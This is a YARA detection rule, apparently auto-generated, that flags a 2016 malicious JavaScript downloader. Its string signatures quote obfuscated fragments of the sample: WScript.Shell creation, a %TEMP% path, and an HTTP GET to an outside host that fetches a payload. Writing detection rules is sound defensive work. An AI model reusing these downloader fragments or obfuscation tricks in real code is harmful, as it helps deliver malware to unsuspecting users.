rule sig_20160427_b9685f9189fa0ed85574acc1d1ba2b29 {
  meta:
    description = "datamaliciousorder - file 20160427_b9685f9189fa0ed85574acc1d1ba2b29.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af3fa361c3ed5478e2df3278cc0260f6d4ffc56edb0acb74b0051f89b6231b0e"

  strings:
    $s1  = "function JzwneJrdxf() {return CvnpqAaoic[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BKo3luQ" ascii
    $s2  = "function JzwneJrdxf() {return CvnpqAaoic[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BKo3luQ" ascii
    $s3  = "function AftnrGljwt(YvbqgPeojr, HlojaSygnz){YsntuRqyed = YsntuRqyed * 1; return YvbqgPeojr - HlojaSygnz;};" fullword ascii
    $s4  = "var CvnpqAaoic = function ZcjvlJihnr() {return PdmlbOxoyb[HcfqfSbfzr](\"WScript\"+\".Shell\");}(), IxnxhZtwez = 11;" fullword ascii
    $s5  = "IxgckBnhuh[UpoctEjuxq](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var PdmlbOxoyb = this[\"WScript\"];" fullword ascii
    $s7  = "if (IxgckBnhuh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function CeejsNfwnx(){return SlgjcClbyi + \"\";};" fullword ascii
    $s9  = "function DqxtzQbecu() {return ((PqkugTkmoz == true) && (PqkugTkmoz == CfqkyVtjno)) ? 1 : YsntuRqyed;};" fullword ascii
    $s10 = "PqkugTkmoz = true; " fullword ascii
    $s11 = "var PqkugTkmoz = false;" fullword ascii
    $s12 = "function YjfkiQnyod(MqmokNlbre) {var IxutuObpfy = (1, 2, 3, 4, 5, MqmokNlbre); return IxutuObpfy;};" fullword ascii
    $s13 = "var YlyxnLkhbi = false;" fullword ascii
    $s14 = "function MxabcTlcuo(){return HcfqfSbfzr;};" fullword ascii
    $s15 = "CfqkyVtjno = true; " fullword ascii
    $s16 = "}while (IhvmvGtcmf);" fullword ascii
    $s17 = "function ProbwGuxvq(){return 23;};" fullword ascii
    $s18 = "return AftnrGljwt(PkyvhIawox, UzubfUpmso);" fullword ascii
    $s19 = "function EdctmUecml()" fullword ascii
    $s20 = "YlyxnLkhbi = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}